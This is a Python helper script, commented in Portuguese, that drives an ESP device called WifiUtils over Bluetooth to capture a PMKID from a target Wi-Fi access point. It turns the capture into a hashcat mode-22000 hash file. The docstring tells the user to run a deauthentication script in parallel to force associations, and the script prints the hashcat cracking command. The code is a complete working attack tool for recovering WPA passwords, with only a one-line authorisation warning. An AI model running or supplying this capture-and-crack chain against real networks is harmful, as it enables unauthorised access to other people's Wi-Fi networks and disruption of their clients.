#!/usr/bin/env python3
"""
PMKID capture via firmware WifiUtils.

Extrai PMKID do M1 do 4-way handshake e gera hash WPA*02 pronto pra
hashcat (modo 22000):

    WPA*02*<pmkid>*<ap_mac>*<sta_mac>*<essid_hex>***

ATENÇÃO: ESP precisa estar **NÃO conectado**. Use somente em redes
próprias ou autorizadas.

Uso:
    ~/.platformio/penv/bin/python scripts/pmkid_capture_test.py \\
        --bssid aa:bb:cc:dd:ee:ff --channel 6 --essid "MinhaRede" \\
        [--duration 90] [--out hash.hc22000]

Pra forçar associação (PMKID vem no M1 do AP), dispare deauth em
paralelo (outra shell):
    ~/.platformio/penv/bin/python scripts/deauth_test.py \\
        --bssid aa:bb:cc:dd:ee:ff --channel 6 --count 30
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_pmkid_found(payload: bytes) -> dict:
    if len(payload) < 28:
        return {"_truncated": payload.hex()}
    bssid = payload[0:6].hex()
    sta = payload[6:12].hex()
    pmkid = payload[12:28].hex()
    return {"bssid": bssid, "sta": sta, "pmkid": pmkid}


def decode_pmkid_done(payload: bytes) -> dict:
    if len(payload) < 12:
        return {"_truncated": payload.hex()}
    bssid = ":".join(f"{b:02x}" for b in payload[0:6])
    return {
        "bssid":      bssid,
        "count":      payload[6],
        "elapsed_ms": int.from_bytes(payload[7:11], "big"),
        "status":     payload[11],
    }


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    hash_lines = []

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        summary = {}

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4:
                return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x1A:
                p = decode_pmkid_found(payload)
                bssid_pretty = ":".join(p['bssid'][i:i+2] for i in range(0, 12, 2))
                sta_pretty   = ":".join(p['sta'][i:i+2]   for i in range(0, 12, 2))
                print(f"  PMKID  bssid={bssid_pretty}  sta={sta_pretty}")
                print(f"         pmkid={p['pmkid']}")
                essid_hex = args.essid.encode("utf-8").hex()
                line = f"WPA*02*{p['pmkid']}*{p['bssid']}*{p['sta']}*{essid_hex}***"
                hash_lines.append(line)
                print(f"  hash: {line}")
            elif mtype == 0x1B:
                summary.update(decode_pmkid_done(payload))
                done_evt.set()
            else:
                print(f"  ?  type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {
            "cmd": "pmkid_capture", "seq": 1,
            "bssid": args.bssid,
            "channel": args.channel,
            "duration_sec": args.duration,
        }
        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        try:
            await asyncio.wait_for(done_evt.wait(), timeout=args.duration + 15)
        except asyncio.TimeoutError:
            print("✗ timeout waiting PMKID_DONE")

        if summary:
            print(f"\nPMKID_DONE: {summary['count']} encontrado(s) "
                  f"em {summary['elapsed_ms']}ms (status={summary['status']})")

        if hash_lines:
            with open(args.out, "w") as f:
                f.write("\n".join(hash_lines) + "\n")
            print(f"\n✓ hash salvo em: {args.out} ({len(hash_lines)} linhas)")
            print(f"→ rodar: hashcat -m 22000 {args.out} wordlist.txt")
        else:
            print("\n⚠ nenhum PMKID capturado — AP pode não suportar, "
                  "ou cliente não associou. Tente disparar deauth em paralelo.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PMKID capture via firmware WifiUtils.",
    )
    parser.add_argument("--bssid", required=True, help="BSSID alvo (aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--channel", type=int, required=True, help="Canal (1–13)")
    parser.add_argument("--essid", required=True,
                        help="ESSID do AP (necessário pra montar hash hashcat)")
    parser.add_argument("--duration", type=int, default=90,
                        help="Duração max (default 90, max 600)")
    parser.add_argument("--out", default="pmkid.hc22000",
                        help="Arquivo de hash (default pmkid.hc22000)")
    args = parser.parse_args()

    asyncio.run(run(args))
